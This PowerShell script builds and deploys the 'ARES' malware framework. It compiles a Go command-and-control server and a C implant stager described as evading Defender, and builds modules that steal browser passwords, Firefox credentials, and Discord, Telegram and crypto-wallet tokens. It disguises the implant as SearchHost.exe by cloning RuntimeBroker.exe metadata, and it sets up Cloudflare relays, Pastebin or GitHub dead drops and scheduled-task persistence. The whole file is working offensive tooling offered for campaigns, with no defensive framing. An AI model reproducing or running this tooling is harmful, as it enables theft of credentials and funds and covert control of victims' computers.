<#
.SYNOPSIS
    ARES Framework â€” One-Click Deployment Script

.DESCRIPTION
    Automates the complete deployment workflow:
      1. Build C2 Server (Go)
      2. Build Agent Stager (C â€” production, Defender CLEAN)
      3. Build COFF Modules (steal_creds, steal_firefox, steal_tokens)
      4. PE Hardening (optional)
      5. Deploy CF Worker Relay
      6. Start C2 + CF Tunnel
    
.PARAMETER CfWorker
    CF Worker hostname (e.g., analytics-edge.xxx.workers.dev)

.PARAMETER Campaign
    Campaign name for unique path generation (e.g., OP_TARGET)

.PARAMETER Port
    C2 server port (default: 8443)

.PARAMETER QuickTunnel
    Use Quick Tunnel (trycloudflare.com) â€” no login needed, temporary URL

.PARAMETER SkipWorkerDeploy
    Skip CF Worker deployment (already deployed)

.PARAMETER BuildOnly
    Only build, don't start services

.EXAMPLE
    .\deploy_all.ps1 -QuickTunnel
    .\deploy_all.ps1 -CfWorker "analytics-edge.xxx.workers.dev" -Campaign OP_TEST
    .\deploy_all.ps1 -BuildOnly
#>
param(
    [string]$CfWorker = "",
    [string]$Campaign = "OP_DEFAULT",
    [int]$Port = 8443,
    [switch]$QuickTunnel,
    [switch]$SkipWorkerDeploy,
    [switch]$BuildOnly,
    [switch]$Harden,
    [string]$DeadDrop1 = "",       # Pastebin raw / Gist URL for dead drop fallback
    [string]$DeadDrop2 = "",       # GitHub raw URL fallback
    [switch]$Persist                # Enable scheduled task persistence
)

$ErrorActionPreference = "Continue"
$projectDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$buildDir = Join-Path $projectDir "build"
$c2Dir = Join-Path $projectDir "c2server"
$relayDir = Join-Path $projectDir "c2-relay"

# â”€â”€ Banner â”€â”€
Write-Host ""
Write-Host "  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Red
Write-Host "  â•‘  â˜   ARES FRAMEWORK â€” Full Deployment  â˜         â•‘" -ForegroundColor Red
Write-Host "  â•‘     Build â†’ Deploy â†’ Launch (One-Click)         â•‘" -ForegroundColor DarkRed
Write-Host "  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Red
Write-Host ""

# â”€â”€ Ensure build directory â”€â”€
if (-not (Test-Path $buildDir)) { New-Item -ItemType Directory -Path $buildDir -Force | Out-Null }

$startTime = Get-Date

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 1: Build C2 Server
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host "[1/6] Building C2 Server (Go)..." -ForegroundColor Cyan

$c2Exe = Join-Path $buildDir "ares_c2.exe"
Push-Location $c2Dir
try {
    & go build -ldflags="-s -w" -o $c2Exe ./cmd/ 2>&1
    if ($LASTEXITCODE -eq 0) {
        $size = [math]::Round((Get-Item $c2Exe).Length / 1MB, 2)
        Write-Host "  [+] C2 Server: $c2Exe ($size MB)" -ForegroundColor Green
    } else {
        Write-Host "  [!] C2 build FAILED!" -ForegroundColor Red
        exit 1
    }
} finally {
    Pop-Location
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 2: Build Agent Stager
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host ""
Write-Host "[2/6] Building Agent Stager (C â€” production)..." -ForegroundColor Cyan

# Generate XOR key
$xorFlag = (py tools/gen_xor_key.py 2>$null)
if (-not $xorFlag) { $xorFlag = "-DCFG_XOR_KEY=0xB3" }
Write-Host "  [*] XOR Key: $xorFlag"

# Compile resources
& windres agent/native/resources.rc -O coff -o "$buildDir/resources.o" 2>$null

# Source files
$stagerSrc = @(
    "agent/native/stager.c",
    "agent/native/core.c",
    "agent/native/syscall.c",
    "agent/native/inject.c",
    "agent/native/bof_loader.c",
    "agent/native/domain_front.c",
    "agent/native/dead_drop.c",
    "agent/native/cap_loader.c",
    "agent/native/stack_spoof.c",
    "agent/native/chrome_stubs.c",
    "$buildDir/resources.o"
)
# ^ No stealer.c: keeps binary CLEAN. Stealer = COFF delivered on-demand via C2.

# Compiler flags
$cflags = @(
    "-Wall", "-O2", "-s", "-mwindows", "-fno-ident",
    "-ffunction-sections", "-fdata-sections",
    "-Wno-format-truncation", "-Wno-stringop-truncation",
    "-Wno-unused-variable", "-Wno-unused-function",
    "-Wno-unused-but-set-variable",
    "-Wno-cpp", "-Wno-unknown-pragmas", "-Wno-format",
    $xorFlag,
    "-Wno-incompatible-pointer-types"
)
# ^ No -DARES_STAGER_STEAL: stealer block excluded from binary

# Add Cloudflare flags if worker specified
if ($CfWorker) {
    $cflags += "-DARES_C2_CLOUDFLARE"
    $cflags += "-DC2_WORKER_HOST=L`"\`"$CfWorker\`"`""
    Write-Host "  [*] CF Worker: $CfWorker"
}
if ($DeadDrop1) {
    $cflags += "-DCFG_DEAD_DROP_URL_1=`\`"$DeadDrop1`\`""
    Write-Host "  [*] Dead drop 1: $DeadDrop1"
}
if ($DeadDrop2) {
    $cflags += "-DCFG_DEAD_DROP_URL_2=`\`"$DeadDrop2`\`""
    Write-Host "  [*] Dead drop 2: $DeadDrop2"
}
if ($Persist) {
    $cflags += "-DCFG_AUTO_PERSIST=1"
    Write-Host "  [*] Auto-persist: ENABLED (schtask)"
}

$ldflags = @("-Wl,--gc-sections,--stack,4194304,--dynamicbase,--nxcompat")
$includes = @("-I.")
$output = @("-o", "$buildDir/ares_prod.exe")
$libs = @("-lkernel32", "-luser32", "-lws2_32", "-lgdi32", "-luuid")

$allArgs = $cflags + $ldflags + $includes + $output + $stagerSrc + $libs
& gcc @allArgs 2>&1

if ($LASTEXITCODE -eq 0) {
    $size = [math]::Round((Get-Item "$buildDir/stager.exe").Length / 1KB, 1)
    Write-Host "  [+] Production beacon: $buildDir\ares_prod.exe ($size KB) [Defender CLEAN]" -ForegroundColor Green
} else {
    Write-Host "  [!] Production beacon build FAILED!" -ForegroundColor Red
    Write-Host "  [!] Check GCC and source files" -ForegroundColor Yellow
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 3: Build COFF Modules
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host ""
Write-Host "[3/6] Building COFF Modules..." -ForegroundColor Cyan

$bofDir = "agent/native/bof"
$modules = @(
    @{ src = "steal_creds_bof.c"; out = "steal_creds.o"; desc = "Browser credentials (Chrome/Edge/Brave/Opera/Vivaldi)" },
    @{ src = "steal_firefox_bof.c"; out = "steal_firefox.o"; desc = "Firefox passwords (NSS PK11SDR)" },
    @{ src = "steal_tokens_bof.c"; out = "steal_tokens.o"; desc = "Discord/Telegram/Crypto wallets" }
)

$moduleDir = Join-Path $c2Dir "data/modules"
if (-not (Test-Path $moduleDir)) { New-Item -ItemType Directory -Path $moduleDir -Force | Out-Null }

foreach ($mod in $modules) {
    $srcFile = Join-Path $bofDir $mod.src
    $outFile = Join-Path $buildDir $mod.out
    
    if (Test-Path $srcFile) {
        & gcc -c -O2 -s $srcFile -o $outFile 2>&1
        if ($LASTEXITCODE -eq 0) {
            $size = [math]::Round((Get-Item $outFile).Length / 1KB, 1)
            Write-Host "  [+] $($mod.out) ($size KB) â€” $($mod.desc)" -ForegroundColor Green
            
            # Copy to C2 modules directory
            Copy-Item $outFile $moduleDir -Force
        } else {
            Write-Host "  [!] $($mod.out) FAILED" -ForegroundColor Red
        }
    } else {
        Write-Host "  [!] Source not found: $srcFile" -ForegroundColor Yellow
    }
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 4: PE Hardening (Optional)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host ""
Write-Host "[4/6] PE Hardening..." -ForegroundColor Cyan

if ($Harden) {
    $stagerExe = Join-Path $buildDir "stager.exe"
    $hardenedExe = Join-Path $buildDir "SearchHost.exe"
    
    if (Test-Path $stagerExe) {
        & py tools/pe_spoof.py $stagerExe -o $hardenedExe --donor "C:/Windows/System32/RuntimeBroker.exe" 2>&1
        if ($LASTEXITCODE -eq 0 -and (Test-Path $hardenedExe)) {
            $size = [math]::Round((Get-Item $hardenedExe).Length / 1KB, 1)
            Write-Host "  [+] Hardened: $hardenedExe ($size KB)" -ForegroundColor Green
            Write-Host "  [+] PE metadata cloned from RuntimeBroker.exe" -ForegroundColor Green
        } else {
            Write-Host "  [!] PE hardening failed â€” using un-hardened stager" -ForegroundColor Yellow
        }
    }
} else {
    Write-Host "  [*] Skipped (use -Harden flag to enable)" -ForegroundColor Gray
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 5: Deploy CF Worker (Optional)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host ""
Write-Host "[5/6] Cloudflare Worker Relay..." -ForegroundColor Cyan

if ($SkipWorkerDeploy -or $BuildOnly) {
    Write-Host "  [*] Skipped" -ForegroundColor Gray
} else {
    if (Test-Path $relayDir) {
        Write-Host "  [*] Deploy CF Worker manually:" -ForegroundColor Yellow
        Write-Host "      cd $relayDir" -ForegroundColor Gray
        Write-Host "      npx wrangler login" -ForegroundColor Gray
        Write-Host "      npx wrangler deploy" -ForegroundColor Gray
        Write-Host "      npx wrangler secret put C2_BACKEND" -ForegroundColor Gray
        Write-Host "      npx wrangler secret put RELAY_KEY" -ForegroundColor Gray
    }
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  Step 6: Start C2 + Tunnel
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Write-Host ""
Write-Host "[6/6] Start C2 Server + Tunnel..." -ForegroundColor Cyan

if ($BuildOnly) {
    Write-Host "  [*] Build-only mode â€” skipping launch" -ForegroundColor Gray
} else {
    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
    
    Write-Host ""
    Write-Host "  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Green
    Write-Host "  â•‘  ARES FRAMEWORK â€” BUILD COMPLETE                     â•‘" -ForegroundColor Green
    Write-Host "  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Build time:   ${elapsed}s" -ForegroundColor White
    Write-Host ""
    Write-Host "  Artifacts:" -ForegroundColor Cyan
    
    if (Test-Path "$buildDir/ares_c2.exe") {
        $s = [math]::Round((Get-Item "$buildDir/ares_c2.exe").Length/1MB, 2)
        Write-Host "    C2 Server:    ares_c2.exe ($s MB)" -ForegroundColor White
    }
    if (Test-Path "$buildDir/stager.exe") {
        $s = [math]::Round((Get-Item "$buildDir/stager.exe").Length/1KB, 1)
        Write-Host "    Agent:        stager.exe ($s KB)" -ForegroundColor White
    }
    if (Test-Path "$buildDir/SearchHost.exe") {
        $s = [math]::Round((Get-Item "$buildDir/SearchHost.exe").Length/1KB, 1)
        Write-Host "    Hardened:     SearchHost.exe ($s KB)" -ForegroundColor White
    }
    foreach ($mod in $modules) {
        $f = Join-Path $buildDir $mod.out
        if (Test-Path $f) {
            $s = [math]::Round((Get-Item $f).Length/1KB, 1)
            Write-Host "    Module:       $($mod.out) ($s KB)" -ForegroundColor White
        }
    }
    
    Write-Host ""
    Write-Host "  To start C2:" -ForegroundColor Yellow
    Write-Host "    .\start_c2_cloudflare.ps1 -QuickTunnel -NoTLS -Port $Port" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Or with Named Tunnel:" -ForegroundColor Yellow
    Write-Host "    .\start_c2_cloudflare.ps1 -Port $Port" -ForegroundColor Gray
    Write-Host ""
}

# â”€â”€ Summary â”€â”€
$elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
Write-Host ""
Write-Host "  Done in ${elapsed}s" -ForegroundColor DarkGray


